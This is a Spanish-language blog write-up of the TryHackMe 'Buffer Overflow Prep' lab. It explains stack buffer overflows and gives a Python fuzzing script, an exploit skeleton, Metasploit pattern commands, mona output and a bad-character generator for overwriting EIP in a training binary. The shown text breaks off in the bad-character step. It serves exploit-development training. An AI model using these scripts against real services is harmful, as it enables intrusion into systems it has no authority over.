@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Buffer Overflow Prep [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='Buffer Overflow, Exploit Development, Hard, Immunity Debugger, Mona, Privilege Escalation, Python, Reverse Shell, TryHackMe, Windows' />
+    
+    
+        <meta name="description" content="la de TryHackMe consiste en realizar una explotación de Buffer Overflow en la aplicación oscp.exe con herramientas como Immunity Debugger, Mona, y msfvenom en un entorno controlado. Es una sala de aprendizaje orientada a la preparación de ataques Buffer Overflow para la certificación OSCP, pero tambíen es un tutorial estupendo para aprender los conceptos básicos de este tipo de ataques." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Buffer Overflow Prep [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-09-19T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="Buffer Overflow" />
+        
+            <meta property="article:tag" content="Exploit Development" />
+        
+            <meta property="article:tag" content="Hard" />
+        
+            <meta property="article:tag" content="Immunity Debugger" />
+        
+            <meta property="article:tag" content="Mona" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Python" />
+        
+            <meta property="article:tag" content="Reverse Shell" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="Windows" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/bufferoverflow_prep/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/bf/bf.png
+        ' />
+    
+        <meta property="og:description" content="Introducción Esta sala de TryHackMe consiste en realizar una explotación de Buffer Overflow en la aplicación oscp.exe con herramientas como Immunity Debugger, M" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/bufferoverflow_prep/" />
+
+
+    <meta name="twitter:title" content="Buffer Overflow Prep [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/bf/bf.png
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Esta sala de TryHackMe consiste en realizar una explotación de Buffer Overflow en la aplicación oscp.exe con herramientas como Immunity Debugger, M" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Buffer Overflow Prep [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-09-19
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/bf/bf.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>Esta sala de TryHackMe consiste en realizar una explotación de Buffer Overflow en la aplicación <code>oscp.exe</code> con herramientas como Immunity Debugger, Mona, y msfvenom en un entorno controlado. Es una sala de aprendizaje orientada a la preparación de ataques Buffer Overflow para la certificación OSCP, pero tambíen es un tutorial estupendo para aprender los conceptos básicos de este tipo de ataques.</p>
+<h2 id="qué-es-un-buffer-overflow">¿Qué es un buffer overflow?</h2>
+<p>Un <em>ataque buffer overflow</em> es un error de programación que sucede cuando se copian una cantidad de datos en un área de memoria que no es suficientemente grande para almacenarlos. Esto causaría un <strong>desbordamiento de <em>buffer</em></strong> o <em><strong>buffer overrun</strong></em>, lo cual hace que los datos de entrada ocupen zonas de memoria adyacentes, donde un atacante podría ejecutar un código malicioso.</p>
+<p>Un desbordamiento de búfer (buffer overflow) es una vulnerabilidad de seguridad que ocurre cuando un programa  o  aplicación intenta almacenar más datos en un búfer (una región de memoria temporal) de lo que puede contener. Esto puede llevar a que los datos sobrantes sobrescriban la memoria adyacente, incluyendo áreas críticas del programa o incluso el sistema operativo, lo que puede tener consecuencias graves.</p>
+<h3 id="para-que-se-puede-usar-el-buffer-overflow"><strong>¿Para que se puede usar el buffer overflow?</strong></h3>
+<p>Un ataque de <em>buffer overflow</em> puede tener diferentes objetivos</p>
+<ol>
+<li><strong>Denegación de servicio del <em>software</em> objetivo.</strong></li>
+<li><strong>Sobreescribir la</strong> <strong>EIP</strong> para ejecutar código arbitrario dentro del sistema.</li>
+</ol>
+<h3 id="registros-de-cpu"><strong>Registros de CPU</strong></h3>
+<p>En un ataque de desbordamiento de búfer (buffer overflow), los registros de la CPU pueden ser fundamentales tanto para el éxito del ataque como para el control posterior sobre el programa o sistema. Los registros más importantes en este contexto son:</p>
+<ol>
+<li><strong>EIP (Extended Instruction Pointer):</strong>  es el registro que indica la dirección de memoria de la próxima instrucción que se ejecutará. En un ataque de desbordamiento de búfer, los atacantes suelen tratar de sobrescribir el valor de EIP para redirigir la ejecución del programa a una ubicación controlada por ellos, donde pueden inyectar código malicioso.</li>
+<li><strong>ESP (Stack Pointer):</strong> es el registro que apunta a la cima de la pila de llamadas (stack) en memoria. Durante un ataque de desbordamiento de búfer, los atacantes pueden manipular el valor de ESP para controlar la ubicación en la que se almacenan los datos en la pila, lo que les permite modificar el flujo de ejecución.</li>
+<li><strong>EBP (Base Pointer):</strong> se utiliza como un punto de referencia en la pila para acceder a variables locales y parámetros de función. Los atacantes también pueden intentar modificar el EBP para manipular la ejecución del programa.</li>
+<li><strong>Otros registros generales:</strong> los registros generales como EAX, EBX, ECX, y EDX también pueden ser utilizados en ataques de desbordamiento de búfer, ya que pueden contener datos que los atacantes intentan sobrescribir o manipular para lograr sus objetivos.</li>
+</ol>
+<h2 id="cómo-se-hace-un-buffer-overflow">¿Cómo se hace un buffer overflow?</h2>
+<p>El proceso se puede resumir en los 4 pasos siguientes:</p>
+<ol>
+<li><strong>EIP Offset (Desplazamiento de EIP):</strong> En el proceso de explotación, uno de los pasos importantes es determinar cuántos bytes se necesitan para sobrescribir el registro EIP (Extended Instruction Pointer). Esto se hace enviando una secuencia de bytes de prueba y observando en qué punto se sobrescribe EIP. El valor en bytes desde el inicio de la secuencia hasta donde se sobrescribe EIP es el &ldquo;EIP offset&rdquo;. Debes encontrar este valor mediante el fuzzing antes de continuar con la explotación.</li>
+<li><strong>Badchars (Caracteres no válidos):</strong> Los &ldquo;badchars&rdquo; son bytes que pueden causar problemas en la explotación, como corromper la carga útil o impedir la ejecución del código malicioso. En este caso, se te pide que identifiques los &ldquo;badchars&rdquo; enviando una secuencia de bytes y comparando lo que se envió con lo que llegó a la memoria del programa objetivo. Los caracteres &ldquo;badchars&rdquo; son aquellos que se comportan de manera inesperada o dañina.</li>
+<li><strong>Encontrar un Punto de Salto (Jump Point):</strong> Una vez que tengas el &ldquo;EIP offset&rdquo; y hayas identificado los &ldquo;badchars&rdquo;, debes encontrar una instrucción de salto (por ejemplo, <code>jmp esp</code>) en el código del programa que no contenga &ldquo;badchars&rdquo;. Esta instrucción de salto se usará para redirigir la ejecución del programa a la carga útil maliciosa.</li>
+<li><strong>Generar la Carga Útil (Payload):</strong> Una vez que tengas todos los elementos anteriores, debes generar una carga útil que se inyectará en el programa objetivo para lograr tu objetivo. La carga útil suele ser código malicioso que te proporciona acceso al sistema objetivo o realiza alguna acción específica.</li>
+<li><strong>Exploit:</strong> Finalmente, ejecutas el exploit modificando el programa objetivo con la carga útil y aprovechando la vulnerabilidad de desbordamiento de búfer para obtener acceso o control sobre el sistema.</li>
+</ol>
+<h1 id="buffer-overflow-prep-oscp">Buffer Overflow Prep OSCP</h1>
+<ul>
+<li><a href="https://bytesoverbombs.io/exploiting-a-64-bit-buffer-overflow-469e8b500f10">Explotando un Buffer Overflow de 64 bits</a></li>
+<li><a href="https://www.abatchy.com/2017/05/jumping-to-shellcode.html">Saltando al Shellcode</a></li>
+<li><a href="http://www.voidcn.com/article/p-ulyzzbfx-z.html">Explicación de Buffer Overflow</a></li>
+<li><a href="https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/">Desarrollo de Exploits en Windows - Parte 4: Localización de Saltos al Shellcode</a></li>
+<li><a href="https://medium.com/@johntroony/a-practical-overview-of-stack-based-buffer-overflow-7572eaaa4982">Una Visión Práctica de Buffer Overflow Basado en la Pila</a></li>
+</ul>
+<p>Apuntes adaptados de:  <a href="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst">https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst</a></p>
+<h2 id="immunity-debugger">Immunity Debugger</h2>
+<p><strong>Siempre ejecuta Immunity Debugger como Administrador si es posible.</strong></p>
+<p>Generalmente, hay dos formas de usar Immunity Debugger para depurar una aplicación:</p>
+<ol>
+<li>Asegúrate de que la aplicación esté en ejecución, abre Immunity Debugger y luego usa <code>Archivo -&gt; Adjuntar</code> para conectar el depurador al proceso en ejecución.</li>
+<li>Abre Immunity Debugger y luego usa <code>Archivo -&gt; Abrir</code> para ejecutar la aplicación.</li>
+</ol>
+<p>Cuando adjuntas una aplicación o abres una aplicación en Immunity Debugger, la aplicación se pausará. Haz clic en el botón &ldquo;Ejecutar&rdquo; o presiona F9.</p>
+<p>Nota: Si el binario que estás depurando es un servicio de Windows, es posible que necesites reiniciar la aplicación mediante <code>sc</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sc stop SLmail
+</span></span><span style="display:flex;"><span>sc start SLmail
+</span></span></code></pre></div><p>Algunas aplicaciones están configuradas para iniciarse desde el administrador de servicios y no funcionarán a menos que se inicien desde el control de servicios.</p>
+<h2 id="configuración-de-mona">Configuración de Mona</h2>
+<p>Mona es un complemento para Immunity Debugger que facilita mucho la explotación de buffer overflows. Descarga: <a href="https://www.notion.so/_static/files/mona.py">mona.py</a></p>
+<ul>
+<li>La última versión se puede descargar aquí: <a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></li>
+<li>El manual se encuentra aquí: <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/</a></li>
+</ul>
+<p>Copiar el archivo <a href="http://mona.py/">mona.py</a> en el directorio PyCommands de Immunity Debugger (generalmente ubicado en C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands).</p>
+<p>En Immunity Debugger, ejecutar el siguiente comando para configurar un directorio de trabajo para mona.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona config -set workingfolder c:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\%</span>p
+</span></span></code></pre></div><h2 id="fuzzing">Fuzzing</h2>
+<p>El siguiente script de Python se puede modificar y usar para fuzzear puntos de entrada remotos de una aplicación. Enviará cadenas de búfer cada vez más largas con la esperanza de que una de ellas finalmente haga que la aplicación se bloquee.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_TARGET&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW1 &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>string <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#66d9ef">as</span> s:
+</span></span><span style="display:flex;"><span>      s<span style="color:#f92672">.</span>settimeout(timeout)
+</span></span><span style="display:flex;"><span>      s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>      s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(string) <span style="color:#f92672">-</span> len(prefix)))
+</span></span><span style="display:flex;"><span>      s<span style="color:#f92672">.</span>send(bytes(string, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span><span style="display:flex;"><span>      s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Fuzzing crashed at </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(string) <span style="color:#f92672">-</span> len(prefix)))
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>  string <span style="color:#f92672">+=</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#34;A&#34;</span>
+</span></span><span style="display:flex;"><span>  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>Asegurarse de que el registro EIP haya sido sobrescrito por A (\x41). Hay que tomar nota de cualquier otro registro que haya sido sobrescrito o que esté apuntando a un espacio en memoria que ha sido sobrescrito.</p>
+<h2 id="replicación-del-bloqueo-y-control-de-eip">Replicación del Bloqueo y Control de EIP</h2>
+<p>El siguiente código de exploit esqueleto se puede usar para el resto de la explotación de buffer overflow:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_TARGET&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW1 &#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
+</span></span></code></pre></div><p>Usando la longitud del búfer que causó el bloqueo, generar un búfer único para determinar el desplazamiento en el patrón que sobrescribe el registro EIP y el desplazamiento en el patrón al que apuntan otros registros. Crea un patrón que sea 400 bytes más largo que el búfer que bloqueó la aplicación para determinar si nuestro shellcode puede encajar de inmediato. Si el búfer más grande no bloquea la aplicación, usa un patrón igual a la longitud del búfer que bloqueó la aplicación y agrega lentamente más al búfer para encontrar espacio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_create -l <span style="color:#ae81ff">600</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</span></span></code></pre></div><p>Mientras el búfer único esté en la pila, usa el comando findmsp de mona o la herramienta en linux msf-pattern_offset, con el argumento de distancia configurado en la longitud del patrón.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Con msf-pattern, donde -q es el adress y -l la longitud</span>
+</span></span><span style="display:flex;"><span>msf-pattern_offset -q <span style="color:#ae81ff">35714234</span> -l <span style="color:#ae81ff">600</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Con Mona en Inmunity Debugger, los dos metodos son validos</span>
+</span></span><span style="display:flex;"><span>!mona findmsp -distance <span style="color:#ae81ff">600</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Buscando un patrón cíclico en la memoria
+</span></span><span style="display:flex;"><span>Patrón cíclico <span style="color:#f92672">(</span>normal<span style="color:#f92672">)</span> encontrado en 0x005f3614 <span style="color:#f92672">(</span>longitud <span style="color:#ae81ff">600</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Patrón cíclico <span style="color:#f92672">(</span>normal<span style="color:#f92672">)</span> encontrado en 0x005f4a40 <span style="color:#f92672">(</span>longitud <span style="color:#ae81ff">600</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Patrón cíclico <span style="color:#f92672">(</span>normal<span style="color:#f92672">)</span> encontrado en 0x017df764 <span style="color:#f92672">(</span>longitud <span style="color:#ae81ff">600</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>EIP contiene un patrón normal: 0x78413778 <span style="color:#f92672">(</span>desplazamiento 112<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ESP <span style="color:#f92672">(</span>0x017dfa30<span style="color:#f92672">)</span> apunta al desplazamiento <span style="color:#ae81ff">116</span> en el patrón normal <span style="color:#f92672">(</span>longitud 484<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>EAX <span style="color:#f92672">(</span>0x017df764<span style="color:#f92672">)</span> apunta al desplazamiento <span style="color:#ae81ff">0</span> en el patrón normal <span style="color:#f92672">(</span>longitud 600<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>EBP contiene un patrón normal: 0x41367841 <span style="color:#f92672">(</span>desplazamiento 108<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Tomar nota del desplazamiento de EIP  y de cualquier otro registro que apunte al patrón, tomando nota de sus desplazamientos también. Parece que el registro ESP apunta a los últimos 484 bytes del patrón, que es suficiente espacio para nuestro shellcode.</p>
+<p>Crea un nuevo búfer utilizando esta información para asegurarte de que puedas controlar EIP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">600</span><span style="color:#f92672">-</span><span style="color:#ae81ff">112</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span></code></pre></div><p>Bloquea la aplicación usando este búfer y asegúrate de que EIP esté sobrescrito por B (\x42) y que el registro ESP apunte al comienzo de los C enviados en el payload.</p>
+<h2 id="encontrar-caracteres-incorrectos">Encontrar Caracteres Incorrectos</h2>
+<p>Genera un bytearray utilizando mona y excluye el byte nulo (\x00) de forma predeterminada. Toma nota de la ubicación del archivo bytearray.bin que se genera.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona bytearray -b <span style="color:#e6db74">&#34;\x00&#34;</span>
+</span></span></code></pre></div><p>Ahora genera una cadena de caracteres incorrectos que sea idéntica al bytearray. El siguiente script de Python se puede utilizar para generar una cadena de caracteres incorrectos desde \x01 hasta \xff:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> print_function
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print()
+</span></span></code></pre></div><p>Coloca la cadena de caracteres incorrectos antes de los C en tu búfer y ajusta la cantidad de C para compensar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>badcharacters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05</span><span style="color:#e6db74">...</span><span style="color:#ae81ff">\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
